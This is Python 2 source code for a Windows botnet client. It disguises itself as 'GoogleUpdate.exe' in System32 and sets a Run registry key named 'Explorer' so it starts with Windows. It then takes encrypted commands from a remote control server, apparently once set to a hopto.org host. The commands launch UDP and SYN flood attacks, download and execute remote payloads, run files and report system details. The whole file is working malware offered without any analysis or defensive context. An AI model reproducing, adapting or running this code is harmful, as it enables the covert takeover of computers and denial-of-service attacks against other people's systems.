from _winreg import *
import sys
import socket
import string
import time
import threading
import os
import os.path
import shutil
import platform
import urllib2
import random

def enc(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])-10+(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;
def dec(s,k) :
    fs = "";
    ka = 0;
    for i in range(0,len(s)) :
        fs += chr(int(ord(s[i])+10-(ord(k[ka])-35+(i%20-len(s)%20))))
        ka+=1;
        ka%=len(k);
    return fs;

global cmd
global d
global s
global key
global outfile
global q
global f
global ip

class Infect(threading.Thread):
    def run(self):
        shutil.copy(sys.argv[0],outfile)
        aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"Explorer",0, REG_SZ, outfile)

class DDOS ( threading.Thread ):
    def run ( self ):
        self.running = True
        target = (cmd[1],cmd[2]);
        soc = socket.socket(socket.AF_INET,socket.SOCK_DGRAM);
        random.seed()
        d = random.random()
        while self.running:
            for x in range(1000):
                soc.sendto(str(d),target);
        s.send("Done")
        print 'Finished DDOSing'

    def stopMe ( self ):
        self.running = False

class Synflood(threading.Thread):
    def run(self):
        self.running = True
        target = (cmd[1],cmd[2])
        while self.running:
            synsock = socket.socket()
            synsock.connect(target)
        s.send("Done")
        print 'Finished SYNFlooding'

    def stopMe ( self ):
        self.running = False

class WaitDDOS ( threading.Thread ):
    def run ( self ):
        time.sleep(cmd[3])
        d.stopMe()
        
class WaitSYN ( threading.Thread ):
    def run ( self ):
        time.sleep(cmd[3])
        q.stopMe()

def Get():
    wget = cmd[1]
    wgetsave = cmd[2]
    try:
        file2down = urllib2.urlopen(wget)
        output = open(wgetsave, 'wb')
        output.write(file2down.read())
        output.close()
        if cmd[0] == 'get':
            if cmd[3] == 1:
                os.popen3(wgetsave)
        elif cmd[0] == 'update':
            os.popen3(wgetsave)
            print 'Closing in 1 second:'
            time.sleep(1)
            sys.exit()
    except:
        print "Failed to 'GET\UPDATE'"

#HOST = 'r0otaccess.hopto.org'
#-------------------------------
HOST = ''
PORT = 8888
#-------------------------------
key = "this is the best key in the world, you'll never guess it :D 4&#*%:J"
bigFlag = True
outfile = os.getcwd()[0]
outfile = outfile + ":\Windows\System32\GoogleUpdate.exe"

if os.path.isfile(outfile) == False:
    Infect().start()
else:
    print "\nComputer is already infected"

while bigFlag:
    bigFlag = False
    connFlag = True
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while connFlag:
        try:
            s.connect((HOST, PORT))
#            s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
            s.send(platform.system() + " " + platform.uname()[2])
            connFlag = False
        except:
            print "Trying to connect again in 2 second"
        time.sleep(2)

    flag = True
    while flag:
        try:
            #print "Waiting for Command"
            cmd = s.recv(10000)
            #print "Received Command"
            cmd = dec(cmd, key)
            cmd = cmd.split(" ")
            if cmd[0] == 'test':
                print "Test command recieved successfully :)"
##            elif cmd[0] == 'ping':
##                print "PINGed"
##                if d.isAlive():
##                    s.send("DDOSing " + ip)
##                elif q.isAlive():
##                    s.send("SynFlooding " + ip)
##                else:
##                    s.send("Idle")
            elif cmd[0] == 'ddos':
                ip = cmd[1]
                cmd[2] = int(cmd[2])
                cmd[3] = int(cmd[3])
                print "DDOSing " + str(cmd[1]) + " on port " + str(cmd[2])
                d = DDOS()
                w = WaitDDOS()
                w.start()
                d.start()
            elif cmd[0] == 'synflood':
                ip = cmd[1]
                cmd[2] = int(cmd[2])
                cmd[3] = int(cmd[3])
                print "SYNFlooding " + str(cmd[1]) + " on port " + str(cmd[2])
                q = Synflood()
                f = WaitSYN()
                f.start()
                q.start()
            elif cmd[0] == 'run':
                try:
                    file2run = cmd[1]
                    if os.path.isfile(file2run) == True:
                        os.popen3(file2run)
                        print "Running " + str(cmd[1])
                    elif os.path.isfile(file2run) == False:
                        print "File not found"
                except:
                    print "An Error Occured Running your File"
                
            elif cmd[0] == 'get' or cmd[0] == 'update':
                if cmd[0] == 'get':
                    cmd[3] = int(cmd[3])
                    print "Getting " + str(cmd[1]) + " and saving as " + str(cmd[2])
                else:
                    print "Updating to " + str(cmd[1])
                Get()
            elif cmd[0] == 'clean':
                flag = False
                aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                try:
                    DeleteValue(aKey, "Explorer")
                    os.remove(outfile)
                    print "Cleaned: 1 second"
                except:
                    print "Cleaned: 1 second"
                time.sleep(1)
            elif cmd[0] == 'info':
                s.send(platform.node() + " - " + platform.system() + " " + platform.uname()[2])
            elif cmd[0] == 'closed':
                flag = False
                bigFlag = True
        except:
            flag = False
            bigFlag = True
